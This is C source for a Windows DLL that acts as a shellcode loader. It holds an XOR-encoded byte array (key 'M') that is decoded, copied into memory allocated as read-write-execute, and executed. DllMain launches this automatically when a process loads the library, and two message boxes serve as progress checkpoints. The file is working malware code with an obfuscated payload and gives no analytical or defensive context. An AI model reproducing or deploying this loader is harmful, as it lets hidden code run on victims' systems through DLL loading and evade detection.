#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned char yHbdv7Op63[] = "\x05\x7c\x84\x05\xcc\xa4\x8b\xb2\xb2\xb2\x05\xc0\x48\xa2\xb2\xb2\xb2\x05\xf6\x4b\x17\xc4\x13\xda\x8a\xb4\xe4\x05\x7c\x15\x6a\x05\x60\xb5\xb2\xb2\xb2\xaf\xb9\xb7\x5f\x47\xf7\x2a\x62\x74\xe4\x4b\x17\x85\x42\x9b\xda\xe6\xb5\x1d\x5f\xf5\xc1\xbf\xc2\x3f\xb6\x2b\x5f\x4f\x41\xc2\xc2\x3f\xb6\x6b\x5f\x4f\x61\x8a\xc2\xbb\x53\x01\x5d\x89\x22\x13\xc2\x85\x24\xe7\x2b\xa5\x6f\xd8\xa6\x94\xa5\x8a\xde\xc9\x52\xdb\x4b\x56\x09\x19\x56\x95\x5b\x51\xd8\x94\x6f\x09\x2b\x8c\x12\x0a\x01\x34\x6c\x4b\x17\xc4\x5b\x5f\x4a\xc0\x83\x03\x16\x14\x43\x51\xc2\xac\xa0\xc0\x57\xe4\x5a\xdb\x5a\x57\xb2\x03\xe8\x0d\x52\x51\xbe\x3c\xac\x4a\xc1\x89\x22\x13\xc2\x85\x24\xe7\x56\x05\xda\xd7\xcb\xb5\x25\x73\xf7\xb1\xe2\x96\x89\xf8\xc0\x43\x52\xfd\xc2\xaf\x52\xec\xa0\xc0\x57\xe0\x5a\xdb\x5a\xd2\xa5\xc0\x1b\x8c\x57\x51\xca\xa8\xad\x4a\xc7\x85\x98\xde\x02\xfc\xe5\x9b\x56\x9c\x52\x82\xd4\xed\xbe\x0a\x4f\x85\x4a\x9b\xd0\xfc\x67\xa7\x37\x85\x41\x25\x6a\xec\xa5\x12\x4d\x8c\x98\xc8\x63\xe3\x1b\xb4\xe8\x99\x5a\x64\xfd\xc7\xd6\x14\x24\xf6\x13\xda\xcb\xe2\xad\xc2\xf1\x8c\x92\x36\x2a\xb5\xe4\x4b\x5e\x4d\xf6\x93\x36\xb6\xe4\x6d\xbd\x04\xbb\xdb\x90\xf5\xb0\x02\x9e\x20\x5f\x53\x7b\xf5\x5e\x07\x60\xe2\x14\x25\x5f\xf8\x6d\xa1\x7f\xc5\x12\xda\x8a\xed\xa5\xf1\x3e\x44\x78\xda\x75\x61\xb4\x1b\x5a\xf5\xda\x97\xbb\x74\xac\xb4\xd7\x8c\x9a\x18\xc2\x4b\x24\x03\x9e\x05\x52\x60\x60\xbb\x3b\xab\xe8\x11\x5b\x53\x4d\xde\xf4\x0a\x4f\x88\x9a\x38\xc2\x3d\x1d\x0a\xad\x5d\xb6\xae\xeb\x4b\x31\x03\x96\x00\x53\xd8\x8a\xb4\xad\xf3\x74\xa9\x77\xda\x8a\xb4\xe4\x4b\x56\x94\x52\x8a\xc2\x3d\x06\x1c\x40\x93\x5e\xeb\x4a\xde\xe9\x12\x56\x94\xf1\x26\xec\x73\xa0\x6f\x43\xc5\x12\x92\x07\xf0\xc0\x53\xd1\xc4\x7b\x92\x03\x52\xb2\x1b\x56\x94\x52\x8a\xcb\xe4\xad\xb4\xd7\x85\x43\x93\x75\x7c\xa9\xc2\xd6\x88\x9a\x1b\xcb\x0e\x9d\x87\x28\x42\xec\x0f\xc2\x85\x36\x03\xe8\x0e\x98\xd4\xcb\x0e\xec\xcc\x0a\xa4\xec\x0f\x31\x44\x51\xe9\x41\x85\xa9\x7c\x1f\x09\x79\xb4\xc2\x8c\x90\x1e\xa2\x88\xe2\x37\x1d\x44\xe8\x3a\xff\xb1\x5f\x0c\x04\xb6\x7c\xb0\x8a\xed\xa5\xc2\xcd\x3b\xc6\xda\x8a\xb4\xe4\x4d";

int LetsGo(void) {
    for (int i = 0; i < sizeof(yHbdv7Op63); i++)
    {
        yHbdv7Op63[i] = yHbdv7Op63[i] ^ 'M';
    }

    MessageBox(NULL,"Program","is on progess",MB_OK);

    void *exec = VirtualAlloc(0, sizeof(yHbdv7Op63), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, yHbdv7Op63, sizeof(yHbdv7Op63));
    ((void(*)())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
    switch (nReason){
    case DLL_PROCESS_ATTACH:
        LetsGo();
        MessageBox(NULL,"Checkpoint 2","done",MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}